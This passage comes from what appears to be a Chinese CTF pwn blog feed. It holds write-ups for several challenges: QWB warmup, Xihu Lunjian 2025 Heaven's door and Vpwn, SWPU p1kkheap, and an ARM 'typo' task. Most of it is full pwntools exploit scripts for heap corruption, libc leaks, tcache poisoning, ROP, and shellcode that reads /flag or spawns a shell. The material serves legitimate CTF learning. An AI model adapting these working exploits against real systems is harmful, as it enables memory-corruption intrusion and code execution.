<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FD-&gt;bk=bk</span><br><span class="line">BK-&gt;fd=FD</span><br><span class="line">p和free_chunk进行合并,这里最重要的就是堆块合并，从而使我们fake_chunk成功进入bins，成为一个合法的chunk</span><br><span class="line">中间覆写了idx_4_chunk</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x55ab94b95c00 —▸ 0x7f6ba0419ce0 ◂— 0x55ab94b95c00</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>

<p>这样一来，我们的p(0x5c00)进入了bins，size为<strong>0x0000000000000a51</strong>，同时还有一个C1(0x5c20)，很明显发生了堆块重叠</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x10)</span><br><span class="line">add(0x10) # index 6 - 8</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">pwndbg&gt; x /20gx 0x55ab9404d000+0x4040</span><br><span class="line">0x55ab94051040: 0x000055ab94b957d0      0x000055ab94b956e0</span><br><span class="line">0x55ab94051050: 0x000055ab94b952c0      0x000055ab94b95c10</span><br><span class="line">0x55ab94051060: 0x000055ab94b96050      0x000055ab94b96660</span><br><span class="line">0x55ab94051070: 0x000055ab94b95c30      0x000055ab94b96a20</span><br><span class="line">0x55ab94051080: 0x000055ab94b95c30		0x0000000000000000</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add(0x3f8)	</span><br><span class="line">show(4)</span><br><span class="line">libc_base = l64() - 0x219ce0</span><br><span class="line">#完成泄露libc</span><br><span class="line">add(0x70) # index 10	实现chunk的复用，idx4，idx10同时指向</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(4)#泄露出heap_base</span><br><span class="line">#debug()</span><br><span class="line">show(10)</span><br><span class="line">rl(b&#x27;Note: &#x27;)</span><br><span class="line">key = u64(p.recv(5).ljust(8,b&#x27;\x00&#x27;)) - 1</span><br><span class="line">heap_base = (key &lt;&lt; 12)</span><br><span class="line">add(0x70) # index 4</span><br></pre></td></tr></table></figure>

<p>之后对tcache bins进行配置</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#这里是清空已分配chunk并填满tcache:0x80</span><br><span class="line">for i in range(4):</span><br><span class="line">    delete(i)</span><br><span class="line">for i in range(5, 8):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(9)</span><br><span class="line"></span><br><span class="line">for i in range(8):</span><br><span class="line">    add(0x70) #index</span><br><span class="line">for i in range(4):</span><br><span class="line">    delete(i)</span><br><span class="line">for i in range(5, 8):</span><br><span class="line">    delete(i)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实现fastbin_double_free</span><br><span class="line">delete(4)</span><br><span class="line">delete(9)</span><br><span class="line">delete(10)</span><br></pre></td></tr></table></figure>

<p>之后是通过打stdout和environ，泄露栈地址，再利用</p>
<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from struct import pack</span><br><span class="line">from ctypes import *</span><br><span class="line">import base64</span><br><span class="line">from subprocess import run</span><br><span class="line">#from LibcSearcher import *</span><br><span class="line">from struct import pack</span><br><span class="line">import tty</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line"></span><br><span class="line">def debug(c = 0):</span><br><span class="line">    if(c):</span><br><span class="line">        gdb.attach(p, c)</span><br><span class="line">    else:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">def get_sb() : return libc_base + libc.sym[&#x27;system&#x27;], libc_base + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span><br><span class="line">#-----------------------------------------------------------------------------------------</span><br><span class="line">s = lambda data : p.send(data)</span><br><span class="line">sa  = lambda text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = lambda data   :p.sendline(data)</span><br><span class="line">sla = lambda text,data  :p.sendlineafter(text, data)</span><br><span class="line">r   = lambda num=4096   :p.recv(num)</span><br><span class="line">rl  = lambda text   :p.recvuntil(text)</span><br><span class="line">pr = lambda num=4096 :print(p.recv(num))</span><br><span class="line">inter   = lambda        :p.interactive()</span><br><span class="line">l32 = lambda    :u32(p.recvuntil(b&#x27;\xf7&#x27;)[-4:].ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">l64 = lambda    :u64(p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">uu32    = lambda    :u32(p.recv(4).ljust(4,b&#x27;\x00&#x27;))</span><br><span class="line">uu64    = lambda    :u64(p.recv(6).ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">int16   = lambda data   :int(data,16)</span><br><span class="line">lg= lambda s, num   :p.success(&#x27;%s -&gt; 0x%x&#x27; % (s, num))</span><br><span class="line">#-----------------------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;, arch=&#x27;amd64&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="line">#p = remote(&#x27;120.24.69.11&#x27;, 12700)</span><br><span class="line">p = process(&#x27;./warmup&#x27;)</span><br><span class="line">elf = ELF(&#x27;./warmup&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line">def add(size, data = b&#x27;a&#x27;):</span><br><span class="line">    sla(b&#x27;&gt;&gt; &#x27;, b&#x27;1&#x27;)</span><br><span class="line">    sla(b&#x27;Size: &#x27;, str(size))</span><br><span class="line">    sa(b&#x27;Note: &#x27;, data)</span><br><span class="line">def show(idx):</span><br><span class="line">    sla(b&#x27;&gt;&gt; &#x27;, b&#x27;2&#x27;)</span><br><span class="line">    sla(b&#x27;Index: &#x27;, str(idx))</span><br><span class="line">def delete(idx):</span><br><span class="line">    sla(b&#x27;&gt;&gt; &#x27;, b&#x27;3&#x27;)</span><br><span class="line">    sla(b&#x27;Index: &#x27;, str(idx))</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">add(0x418) #0 A = P-&gt;fd</span><br><span class="line">add(0x108 - 0x20) #1 barrier</span><br><span class="line">add(0x438) #2 B0 helper</span><br><span class="line">add(0x438) #3 C0 = P , P&amp;0xff = 0</span><br><span class="line">add(0x108) #4 barrier</span><br><span class="line">add(0x488) # H0. helper for write bk-&gt;fd. vitcim chunk.</span><br><span class="line">add(0x428) # 6 D = P-&gt;bk</span><br><span class="line">add(0x108) # 7 barrier</span><br><span class="line"></span><br><span class="line"># step 2 use unsortedbin to set p-&gt;fd =A , p-&gt;bk=D</span><br><span class="line">delete(0) # A</span><br><span class="line">delete(3) # C0</span><br><span class="line">delete(6) # D</span><br><span class="line"># unsortedbin: D-C0-A   C0-&gt;FD=A</span><br><span class="line">delete(2) # merge B0 with C0. preserve p-&gt;fd p-&gt;bk</span><br><span class="line">add(0x458, b&#x27;\x00&#x27;*0x438 + p64(0x551)[:-2])  # put A,D into largebin, split BC. use B1 to set p-&gt;size=0x551  0</span><br><span class="line"># recovery</span><br><span class="line">add(0x418)  # C1 from ub   2</span><br><span class="line">add(0x428)  # bk  D  from largebin   3</span><br><span class="line">add(0x418)  # fd    A from largein    6</span><br><span class="line">debug()</span><br><span class="line"></span><br><span class="line"># step3 use unsortedbin to set fd-&gt;bk</span><br><span class="line"># partial overwrite fd -&gt; bk</span><br><span class="line">delete(6) # A=P-&gt;fd</span><br><span class="line">delete(2) # C1</span><br><span class="line"># unsortedbin: C1-A ,   A-&gt;BK = C1</span><br><span class="line">add(0x418, p64(0))  # 2 partial overwrite bk    A-&gt;bk = p</span><br><span class="line">add(0x418) #    6</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(6) # A=P-&gt;fd</span><br><span class="line">delete(3) # C1</span><br><span class="line">delete(5) # C1 和 H0 合并</span><br><span class="line"></span><br><span class="line">add(0x4f8, b&#x27;\x00&#x27;*0x490) # 3</span><br><span class="line">add(0x3b0)  # 5     BK-&gt;fd=p</span><br><span class="line">add(0x418)  # 6</span><br><span class="line"></span><br><span class="line">delete(4)</span><br><span class="line">sla(b&#x27;&gt;&gt; &#x27;, b&#x27;1&#x27;)</span><br><span class="line">sla(b&#x27;Size: &#x27;, str(0x108))</span><br><span class="line">sa(b&#x27;Note: &#x27;, b&#x27;\x00&#x27;*0x100 + p64(0x550)) # 4</span><br><span class="line"></span><br><span class="line">delete(3)# 触发unlink</span><br><span class="line"></span><br><span class="line">add(0x10)</span><br><span class="line">add(0x10) # index 6 - 8</span><br><span class="line">add(0x3f8)</span><br><span class="line">show(4)</span><br><span class="line">libc_base = l64() - 0x219ce0</span><br><span class="line"></span><br><span class="line">add(0x70) # index 10</span><br><span class="line">delete(4)</span><br><span class="line">show(10)</span><br><span class="line">rl(b&#x27;Note: &#x27;)</span><br><span class="line">key = u64(p.recv(5).ljust(8,b&#x27;\x00&#x27;)) - 1</span><br><span class="line">heap_base = (key &lt;&lt; 12)</span><br><span class="line"></span><br><span class="line">add(0x70) # index 4</span><br><span class="line">for i in range(4):</span><br><span class="line">    delete(i)</span><br><span class="line">for i in range(5, 8):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(9)</span><br><span class="line"></span><br><span class="line">for i in range(4):</span><br><span class="line">    add(0x70) # index 0 ~ 3</span><br><span class="line">for i in range(5, 8):</span><br><span class="line">    add(0x70) #index 5 ~ 7</span><br><span class="line">add(0x70) #index 9</span><br><span class="line">for i in range(4):</span><br><span class="line">    delete(i)</span><br><span class="line">for i in range(5, 8):</span><br><span class="line">    delete(i)</span><br><span class="line"></span><br><span class="line">delete(4)</span><br><span class="line">delete(9)</span><br><span class="line">delete(10)</span><br><span class="line"></span><br><span class="line">for i in range(7):</span><br><span class="line">    add(0x70)</span><br><span class="line">add(0x70, p64((heap_base + 0xf0) ^ (key + 1)))</span><br><span class="line"></span><br><span class="line">environ = libc_base + libc.sym[&#x27;__environ&#x27;]</span><br><span class="line">stdout = libc_base + libc.sym[&#x27;_IO_2_1_stdout_&#x27;]</span><br><span class="line"></span><br><span class="line">add(0x70)</span><br><span class="line">add(0x70)</span><br><span class="line">add(0x70, p64(0) + p64(stdout) + p64(0) + p64(heap_base + 0x260))</span><br><span class="line"></span><br><span class="line">pl = p64(0x00000000fbad1800) + p64(0)*3 + p64(environ) + p64(environ + 8)</span><br><span class="line">add(0xe0, pl)</span><br><span class="line">stack = l64()</span><br><span class="line"></span><br><span class="line">delete(0)</span><br><span class="line">delete(1)</span><br><span class="line">add(0x100, p64(stack - 0x148))</span><br><span class="line"></span><br><span class="line">ret = libc_base + 0x29139</span><br><span class="line">rsi = libc_base + 0x2be51</span><br><span class="line">rdi = libc_base + 0x2a3e5</span><br><span class="line">rdx = libc_base + 0x796a2</span><br><span class="line">mprotect = libc_base + libc.sym[&#x27;mprotect&#x27;]</span><br><span class="line"></span><br><span class="line">#debug(&#x27;b *$rebase(0x17e9)\nb *$rebase(0x1895)\n&#x27;)</span><br><span class="line"></span><br><span class="line">pl = p64(0) + p64(rdi) + p64((stack &gt;&gt; 12) &lt;&lt; 12) + p64(rsi) + p64(0x3000) + p64(rdx) + p64(7) + p64(mprotect)</span><br><span class="line">pl += p64(stack - 0x100) + asm(shellcraft.open(&#x27;/flag&#x27;) + shellcraft.read(3, stack + 0x1000, 0x50) + shellcraft.write(1, stack + 0x1000, 0x50))</span><br><span class="line"></span><br><span class="line">add(0x3b0, pl)</span><br><span class="line"></span><br><span class="line">lg(&#x27;stack&#x27;, stack)</span><br><span class="line">lg(&#x27;heap_base&#x27;, heap_base)</span><br><span class="line">lg(&#x27;key&#x27;, key)</span><br><span class="line">lg(&#x27;libc_base&#x27;, libc_base)</span><br><span class="line"></span><br><span class="line">print(p.recvline())</span><br><span class="line">#debug()</span><br><span class="line">#pause()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>qwb</tag>
      </tags>
  </entry>
  <entry>
    <title>iot环境遇到的一些问题</title>
    <url>/2025/03/09/IOT%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%E9%81%87%E5%88%B0%E7%9A%84%E4%B8%80%E4%BA%9B%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<p>IOT环境配置遇到的一些问题</p>
<p>binwalk记得安个python库</p>
<p>capstone&#x3D;&#x3D;5.0.1</p>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>iot</tag>
      </tags>
  </entry>
  <entry>
    <title>西湖论剑-2025</title>
    <url>/2025/01/26/2025-%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/</url>
    <content><![CDATA[<h1 id="Heaven’s-door"><a href="#Heaven’s-door" class="headerlink" title="Heaven’s door"></a>Heaven’s door</h1><p>父子进程，父进程执行shellcode，子进程打印字符串</p>
<p>存在沙箱，允许orw，允许shellcode最多存在一个syscall</p>
<p>这里直接写jmp了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">from pwncli import *</span><br><span class="line">from bitstring import BitArray</span><br><span class="line"></span><br><span class="line">cli_script()  # 使用脚本模式必须显式调用这个函数</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line"># 你能够从gift里面取到很多东西</span><br><span class="line">io = gift[&quot;io&quot;]  # process或remote对象</span><br><span class="line">elf = gift[&quot;elf&quot;]  # ELF对象，ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = gift.libc  # ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">rop = gift.rop  # ROP对象</span><br><span class="line">filename = gift.filename  # current filename</span><br><span class="line">is_debug = gift.debug  # is debug or not</span><br><span class="line">is_remote = gift.remote  # is remote or not</span><br><span class="line">gdb_pid = gift.gdb_pid  # gdb pid if debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uu64 = lambda: u64(ru(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br><span class="line">if gift.remote:</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    gift[&quot;libc&quot;] = libc</span><br><span class="line"></span><br><span class="line">shellcode = asm(</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">push 0x0 </span><br><span class="line">push 0x67616c66</span><br><span class="line"></span><br><span class="line">mov r12,0</span><br><span class="line">theopen:</span><br><span class="line">mov rdi,rsp</span><br><span class="line">xor rsi,rsi</span><br><span class="line">xor rdx,rdx</span><br><span class="line">mov rax,0x02  </span><br><span class="line">inc r12</span><br><span class="line">jmp lab1</span><br><span class="line"></span><br><span class="line">theread:</span><br><span class="line">mov rsi,rdi</span><br><span class="line">mov rdx,0x100</span><br><span class="line">mov rdi,3   </span><br><span class="line">mov rax,0</span><br><span class="line">inc r12</span><br><span class="line">jmp lab1</span><br><span class="line"></span><br><span class="line">thewrite:</span><br><span class="line">mov rdx,0x100</span><br><span class="line">mov rdi,1</span><br><span class="line">mov rax,1</span><br><span class="line">jmp lab1</span><br><span class="line">lab1:</span><br><span class="line">    syscall</span><br><span class="line">    cmp r12,1</span><br><span class="line">    jg thewrite</span><br><span class="line">    je theread</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">)</span><br><span class="line"># read(0,0x67616c66,0x100)</span><br><span class="line">sl(shellcode)</span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="Vpwn"><a href="#Vpwn" class="headerlink" title="Vpwn"></a>Vpwn</h1><p>对vector的管理，cpp，保护全开</p>
<p>edit和print以<code>v8+0x18</code>(长度)为范围</p>
<p>但push可以覆写长度，之后就是print泄露libc，edit改返回地址，打个rop</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/env python3</span><br><span class="line">from pwncli import *</span><br><span class="line">from bitstring import BitArray</span><br><span class="line"></span><br><span class="line">cli_script()  # 使用脚本模式必须显式调用这个函数</span><br><span class="line">context.arch = &quot;amd64&quot;</span><br><span class="line"></span><br><span class="line"># 你能够从gift里面取到很多东西</span><br><span class="line">io = gift[&quot;io&quot;]  # process或remote对象</span><br><span class="line">elf = gift[&quot;elf&quot;]  # ELF对象，ELF(&quot;./pwn&quot;)</span><br><span class="line">libc = gift.libc  # ELF对象， ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">rop = gift.rop  # ROP对象</span><br><span class="line">filename = gift.filename  # current filename</span><br><span class="line">is_debug = gift.debug  # is debug or not</span><br><span class="line">is_remote = gift.remote  # is remote or not</span><br><span class="line">gdb_pid = gift.gdb_pid  # gdb pid if debug</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">uu64 = lambda: u64(ru(&quot;\x7f&quot;).ljust(8, b&quot;\x00&quot;))</span><br><span class="line"># ra = lambda: r.recvall(timeout=1)</span><br><span class="line"></span><br><span class="line"># 有时候远程提供的libc与本地不一样，打靶机时替换libc为远程libc</span><br><span class="line">if gift.remote:</span><br><span class="line">    libc = ELF(&quot;./libc.so.6&quot;)</span><br><span class="line">    gift[&quot;libc&quot;] = libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def push(size):</span><br><span class="line">    sla(&quot;choice: &quot;, &quot;2&quot;)</span><br><span class="line">    sla(&quot;push: &quot;, str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def pop():</span><br><span class="line">    sla(&quot;choice: &quot;, &quot;3&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sla(&quot;choice: &quot;, &quot;4&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(idx, content):</span><br><span class="line"></span><br><span class="line">    sla(&quot;choice: &quot;, &quot;1&quot;)</span><br><span class="line">    sla(&quot;(0-based): &quot;, str(idx))</span><br><span class="line">    sla(&quot;value: &quot;, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">push(10)</span><br><span class="line">push(10)</span><br><span class="line">push(10)</span><br><span class="line">push(10)</span><br><span class="line">push(10)</span><br><span class="line">push(10)</span><br><span class="line">push(0x30)</span><br><span class="line">show()</span><br><span class="line">ru(&quot;0 1 0 &quot;, drop=True)</span><br><span class="line">a = int(ru(&quot; &quot;, drop=True))</span><br><span class="line">b = int(ru(&quot; &quot;, drop=True))</span><br><span class="line">bm = BitArray(int=a, length=32).hex</span><br><span class="line">print(&quot;libc-----&gt;&quot;, libc)</span><br><span class="line">libc.address = int(bm, 16) + (b &lt;&lt; 32) - 171408</span><br><span class="line">log_libc_base_addr(libc.address)</span><br><span class="line">binsh = next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line">system = libc.symbols[&quot;system&quot;]</span><br><span class="line">pop_rdi = 0x000000000002A3E5 + +libc.address</span><br><span class="line">ret = 0x0000000000029139 + libc.address</span><br><span class="line">gadget = [&quot;0xebc81&quot;, &quot;0xebc85&quot;, &quot;0xebc88&quot;, &quot;0xebce2&quot;, &quot;0xebd38&quot;, &quot;0xebd3f&quot;, &quot;0xebd43&quot;]</span><br><span class="line">log_address(&quot;pop_rdi&quot;, pop_rdi)</span><br><span class="line">pop_rdi_low = pop_rdi &amp; 0xFFFFFFFF</span><br><span class="line">pop_rdi_high = pop_rdi &gt;&gt; 32</span><br><span class="line">log_address(&quot;pop_rdi_high&quot;, pop_rdi_high)</span><br><span class="line">log_address(&quot;pop_rdi_low&quot;, pop_rdi_low)</span><br><span class="line">binsh_low = binsh &amp; 0xFFFFFFFF</span><br><span class="line">log_address(&quot;binsh_low&quot;, binsh_low)</span><br><span class="line">system_low = system &amp; 0xFFFFFFFF</span><br><span class="line">log_address(&quot;system_low&quot;, system_low)</span><br><span class="line">ret_low = ret &amp; 0xFFFFFFFF</span><br><span class="line">pop_rsi = 0x000000000002BE51 + libc.address</span><br><span class="line">pop_rsi_low = pop_rsi &amp; 0xFFFFFFFF</span><br><span class="line">pop_rsi_high = pop_rsi &gt;&gt; 32</span><br><span class="line">log_address(&quot;pop_rsi_low&quot;, pop_rsi_low)</span><br><span class="line">log_address(&quot;pop_rsi_high&quot;, pop_rsi_high)</span><br><span class="line">edit(18, str(ret &amp; 0xFFFFFFFF))</span><br><span class="line">edit(19, str(ret &gt;&gt; 32))</span><br><span class="line">edit(20, str(pop_rdi &amp; 0xFFFFFFFF))</span><br><span class="line">edit(21, str(pop_rdi &gt;&gt; 32))</span><br><span class="line">edit(22, str(binsh &amp; 0xFFFFFFFF))</span><br><span class="line">edit(23, str(binsh &gt;&gt; 32))</span><br><span class="line">edit(24, str(pop_rsi &amp; 0xFFFFFFFF))</span><br><span class="line">edit(25, str(pop_rsi &gt;&gt; 32))</span><br><span class="line">edit(26, str(0))</span><br><span class="line">edit(27, str(0))</span><br><span class="line">edit(28, str(system &amp; 0xFFFFFFFF))</span><br><span class="line">edit(29, str(system &gt;&gt; 32))</span><br><span class="line">sl(&quot;5&quot;)</span><br><span class="line">ia()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>SWPU 2019 p1kkheap</title>
    <url>/2023/10/11/SWPU-2019-p1kkheap/</url>
    <content><![CDATA[<p> glibc-2.27</p>
<p>PIE开启</p>
<p>存在uaf和double</p>
<p>选择攻击tcache_struct，改变tcache_bin的内容泄露libc_base，改变链表头实现任意内存写</p>
<p>同时程序开启了沙盒，需要进行orw，在buf上写orw_shellcode，修改malloc_hook为shellcode，程序限制malloc次数和free次数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">r=process(&quot;./pwn&quot;)</span><br><span class="line">r=remote(&quot;node5.anna.nssctf.cn&quot;,28244)</span><br><span class="line">elf=ELF(&quot;./pwn&quot;)</span><br><span class="line">libc=elf.libc</span><br><span class="line">context.log_level=&quot;debug&quot;</span><br><span class="line">context(arch=&quot;amd64&quot;,os=&quot;linux&quot;)</span><br><span class="line">def add(size):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;1&quot;)</span><br><span class="line">    r.recvuntil(&quot;size: &quot;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line"></span><br><span class="line">def show(id):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;2&quot;)</span><br><span class="line">    r.recvuntil(&quot;id: &quot;)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line"></span><br><span class="line">def edit(id,content):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;3&quot;)</span><br><span class="line">    r.recvuntil(&quot;id: &quot;)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line">    r.recvuntil(&quot;content: &quot;)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line">def delete(id):</span><br><span class="line">    r.recvuntil(&quot;Your Choice: &quot;)</span><br><span class="line">    r.sendline(&quot;4&quot;)</span><br><span class="line">    r.recvuntil(&quot;id: &quot;)</span><br><span class="line">    r.sendline(str(id))</span><br><span class="line"></span><br><span class="line">#gdb.attach(r)</span><br><span class="line">add(0x100)#0</span><br><span class="line">add(0x100)#1</span><br><span class="line">delete(0)</span><br><span class="line">delete(0)</span><br><span class="line">#pause()</span><br><span class="line">show(0)</span><br><span class="line">r.recvuntil(&quot;content: &quot;)</span><br><span class="line">heap_base=u64(r.recvuntil(&quot;\n&quot;,drop=True).ljust(8,b&quot;\x00&quot;))-0x260</span><br><span class="line">print(hex(heap_base))</span><br><span class="line">add(0x100)#2</span><br><span class="line">edit(2,p64(heap_base))</span><br><span class="line"></span><br><span class="line">add(0x100)#3</span><br><span class="line">add(0x100)#4</span><br><span class="line">edit(4,p64(0)+p64(0x251)+b&quot;\x07&quot;*0x40)</span><br><span class="line">delete(3)</span><br><span class="line">show(3)</span><br><span class="line">main_arena_addr=u64(r.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,b&quot;\x00&quot;))-96</span><br><span class="line">print(hex(main_arena_addr))</span><br><span class="line">libc.address=main_arena_addr-0x3ebc40</span><br><span class="line">print(hex(libc.address))</span><br><span class="line">malloc_hook_addr=libc.sym[&quot;__malloc_hook&quot;]</span><br><span class="line">print(hex(malloc_hook_addr))</span><br><span class="line">buf=0x66660000</span><br><span class="line"></span><br><span class="line">edit(4,p64(0)+p64(0x251)+b&quot;\x07&quot;*0x40+p64(malloc_hook_addr)+p64(0)*5+p64(buf))</span><br><span class="line">shellcode=asm(shellcraft.open(&quot;/flag&quot;)+shellcraft.read(3,buf+0x500,0x30)+shellcraft.write(1,buf+0x500,0x30))</span><br><span class="line"></span><br><span class="line">add(0x70)#buf,5</span><br><span class="line">edit(5,shellcode)</span><br><span class="line">add(0x10)#malloc,6</span><br><span class="line"></span><br><span class="line">edit(6,p64(buf))</span><br><span class="line"></span><br><span class="line">add(0x10)</span><br><span class="line">print(r.recvline())</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>arm-初探</title>
    <url>/2023/11/13/arm-%E5%88%9D%E6%8E%A2/</url>
    <content><![CDATA[<p> 根据各位大师傅的博客搭好调试的环境</p>
<p>ARM32&#x3D;ARMv7</p>
<p>ARM64&#x3D;AARCH64&#x3D;ARMv8</p>
<h1 id="预备知识"><a href="#预备知识" class="headerlink" title="预备知识"></a>预备知识</h1><p>在arm中，调用函数是以<strong>r0~r3</strong>这四个寄存器为参数的，剩下的参数从右到左依次放入栈中，同时，函数返回值放在r0寄存器中。</p>
<p>arm中的b&#x2F;bl指令用来实现跳转，而pc寄存器相当于x86中的eip，保存下一条指令的地址。</p>
<p>在arm中gadget多是pop {xx,xx,xx,pc}以pc寄存器结尾的,至少本题是</p>
<p>对于ret2svc(arm中的arm)，r7类似于rax寄存器，存储函数调用号，svc指令类似于syscall，用于执行系统调用</p>
<h1 id="typo"><a href="#typo" class="headerlink" title="typo"></a>typo</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from ownpwn.mypwn import *</span><br><span class="line">io=setup(&quot;./typo&quot;,arch=&quot;arm32&quot;)</span><br><span class="line">#shellcode=b&quot;\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x78\x46\x0a\x30\x01\x90\x01\xa9\x92\x1a\x0b\x27\x01\xdf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x00\x00&quot;</span><br><span class="line">system=0x000110B4</span><br><span class="line">binsh=0x0006C384</span><br><span class="line">p7=0x00014068</span><br><span class="line">p0_4=0x00020904</span><br><span class="line">p1=0x00068bec</span><br><span class="line">p4_7=0x00023dbc</span><br><span class="line">p3=0x00008160</span><br><span class="line">mov_2_4=0x0003338c</span><br><span class="line">svc=0x0000fed0</span><br><span class="line">payload=cyclic(112)+p32(p0_4)+p32(binsh)+p32(0)+p32(p1)+p32(0)+p32(p4_7)+p32(0)+p32(0xb)+p32(p3)+p32(svc)+p32(mov_2_4)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">r0=/bin/sh</span><br><span class="line">r1=0</span><br><span class="line">r2=0</span><br><span class="line">r7=0xb</span><br><span class="line">mov_2_4;bl r3</span><br><span class="line">r3=svc</span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#payload=cyclic(112)+p32(p0_4)+p32(binsh)*2+p32(system)</span><br><span class="line">sa(&quot;quit&quot;,&quot;\n&quot;)</span><br><span class="line">sa(&quot;------Begin------&quot;,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h1 id="aarch64"><a href="#aarch64" class="headerlink" title="aarch64"></a>aarch64</h1><p>arm64的指令和寄存器等，与arm32多少有点出入</p>
<p>x0-x31为通用寄存器</p>
<p>x0-x7用于参数传递</p>
<p>x9-x15在子函数中，可直接使用这些寄存器，无需save&#x2F;restore</p>
<p>x19-x29在callee等子函数中使用这些，一般需要先save，在退出子函数时再resotre</p>
<p>x8，x16-x18，x29，x30是特殊用途的寄存器</p>
<p>x8相当于rax&#x2F;r7，用于存储函数返回值</p>
<p>x16-x16用于进程内临时寄存器</p>
<p>x18通常被保留给应用二进制接口（ABI）</p>
<p>x29类似于rbp寄存器，用于指向栈帧，即fp</p>
<p>X30 是链接寄存器，也就是存储返回地址的寄存器</p>
<p>SP寄存器则是类似于rsp寄存器，指向栈顶</p>
<p>PC类似于eip</p>
<h1 id="babyarm"><a href="#babyarm" class="headerlink" title="babyarm"></a>babyarm</h1><p>本题中没有pop的gadget，但可以利用arm64下的ret2csu</p>
